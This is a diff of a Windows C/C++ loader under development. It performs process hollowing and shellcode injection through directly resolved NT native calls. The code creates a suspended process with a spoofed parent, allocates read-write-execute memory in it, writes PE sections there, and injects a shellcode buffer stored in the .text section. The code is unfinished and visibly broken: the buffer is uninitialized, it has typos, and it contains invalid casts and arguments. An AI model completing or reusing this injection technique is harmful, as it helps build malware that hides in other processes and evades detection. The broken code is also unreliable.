@@ -6,10 +6,14 @@
 #include <intrin.h>
 #include <shlwapi.h>
 #pragma comment(lib, "shlwapi.lib")
+#pragma section(".text")
+__declspec(allocate(".text")) CONST UCHAR buf[]
+
 #define g(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
 #define e(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
 #define i(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
 #define ss 0x00000000
+#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
 #define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001 // NtCreateUserProcess & NtCreateThreadEx
 #define PS_ATTRIBUTE_PARENT_PROCESS PsAttributeValue(PsAttributeParentProcess, FALSE, TRUE, TRUE)
 size_t GMH() {
@@ -177,57 +181,54 @@ int main(void) {
         IMAGE_OPTIONAL_HEADER base = ntHdr->OptionalHeader.ImageBase;
         IMAGE_OPTIONAL_HEADER size = ntHdr->OptionalHeader.SizeOfImage;
 
+        PCONTEXT CTX;
+        PVOID baseAddress = NULL;
+        SIZE_T rs =sizeof(CONTEXT);
+        HANDLE crp = (HANDLE)-1;
 
-        LPVOID baseAddress = NULL;
-
-
+        status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG_PTR, PSZIE_T, ULONG, ULONG))ptr_NtAllocateVirtualMemory)(crp, &baseAddress, 0, &rs,MEM_COMMIT ,PAGE_READWRITE);
 
         if (statCheck(status)) {
+
             g("context allocated at %p",   &baseAddress);
+            CTX = (LPCONTEXT)baseAddress;
+            CTX->ContextFlags = CONTEXT_FULL;
         }
+        else {return 1;}
 
-        LPCONTEXT CTX;
-        // here, go from here later
-        status = ((NTSTATUS(NTAPI*)())ptr_NtAllocateVirtualMemory)(NULL, &baseAddress, sizeof(CTX),MEM_COMMIT, PAGE_READWRITE);
-        CTX = LPCONTEXT(&baseAddress);
-        CTX ->ContextFlags = CONTEXT_FULL;
-
-
-
-        PCONTEXT pContext;
-
-        status = ptr_NtGetContextThread();
+        ((NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))ptr_NtGetContextThread)(nThread, LPCONTEXT(CTX));
         if (statCheck(status)) {
 
             g("context thread gotten at %p",  &baseAddress);
 
+            status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG))ptr_NtAllocateVirtualMemory)(hProcess, &base, 0, &size,0x3000 ,PAGE_EXECUTE_READWRITE);
 
-            LPVOID t;
-            status = ((UINT (NTAPI*)(HANDLE, BaseAddress, ULONG_PTR, PSZIE_T, ULONH, ULONG))ptr_NtAllocateVirtualMemory)(hProcess, base , size, 0x3000, PAGE_EXECUTE_READWRITE);
+            if (statCheck(status)) {
+
+                status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))ptr_NtWriteVirtualMemory)(nProcess, &base, NULL, size, &size);
+
+                for (int i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
+
+                    VirtAddr = LPVOID((size_t)base + SectionHeader[i].VirtualAddress);
+                    Ptr = LPVOID((size_t)modb + SectionHeader[i].PointerToRawData);
+                    szrd = SectionHeader[i].SizeOfRawData;
+
+                    status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))ptr_NtWriteVirtualMemory)(nProcess, &VirtAddr, Ptr, szrd, &szrd);
+
+
+                }
+                    // shellcdoe injection here
+
+                status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))ptr_NtWriteVirtualMemory)(nProcess, nProcess, buf, sizeof(buf), &sizeof(buf));
+
+
+
+            }
 
 
         }
 
 
-       // status = NtUnmmapViewOfSection();
-
-
-
-        status = ptr_NtGetContextThread();
-
-
-        if (status == STATUS_SUCCESS) {
-
-
-        }
-
-
-
-        status = ptr_NtWriteVirtualMemory();
-
-
-
-        status = ptr_NtResumeThread();
 
 
 
